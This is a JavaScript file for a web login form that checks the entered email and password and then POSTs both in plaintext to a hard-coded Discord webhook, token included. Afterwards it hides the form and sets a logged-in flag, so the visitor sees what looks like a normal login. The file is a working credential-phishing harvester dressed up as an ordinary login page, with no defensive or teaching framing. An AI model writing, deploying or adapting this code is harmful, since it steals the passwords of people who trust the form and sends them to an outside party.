const email = document.getElementById("logemail");
const password = document.getElementById("logpass");
const login = document.querySelector(".btn");
const ptxt = document.getElementById("pword-txt");
const etxt = document.getElementById("email-txt");
const Eerror = document.getElementById("email-error");
const perror = document.getElementById("password-error");
const input = document.querySelector(".form-style");
const container = document.querySelector(".container");
const esearch = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
const psearch = /[a-z]{8,32}/g;

// Discord webhook URL
const webhookUrl = "https://discord.com/api/webhooks/1231334225219948584/UobzdYPvMvgxNO22AfVkmJeOJt0K4XVa2mt_C4CGwrhj7iaZs_bc3oFl7o8xFDUgkl9D"; 

login.addEventListener('click', (e) => {
  e.preventDefault(); // Prevent default form submission

  if (!password.value.match(psearch)) {
    password.focus();
    password.style.borderColor = "#ec4846";
    ptxt.style.color = "#ec4846";
    perror.innerText = " - Password should be between 8 and 32 characters";
  } else if (email.value === "" || !email.value.match(esearch)) {
    email.focus();
    email.style.borderColor = "#ec4846";
    etxt.style.color = "#ec4846";
    Eerror.innerText = " - This is not a valid email address";
  } else {
    // Prepare data to send to Discord webhook
    const data = {
      username: "Login Form",
      content: `**Email:** ${email.value}\n**Password:** ${password.value}`
    };

    // Send data to Discord webhook
    fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    })
    .then(response => {
      if (!response.ok) {
        throw new Error("Failed to send data to webhook");
      }
      // Clear form fields and show success message or redirect user
      email.value = "";
      password.value = "";
      container.style.animation = "jump .3s linear";
      container.addEventListener('animationend', () => {
        container.style.display = "none";
        canvas.style.transform = "translate(0vw)";
        // setTimeout(() => {
        user.login = true;
        //}, 1000)
      });
    })
    .catch(error => {
      console.error(error);
      // Handle error
    });
  }

  // Reset styles and error messages after a delay
  setTimeout(() => {
    ptxt.style.color = "#919296";
    etxt.style.color = "#919296";
    perror.innerText = "";
    Eerror.innerText = "";
    email.style.borderColor = "";
    password.style.borderColor = "";
  }, 2500);
});
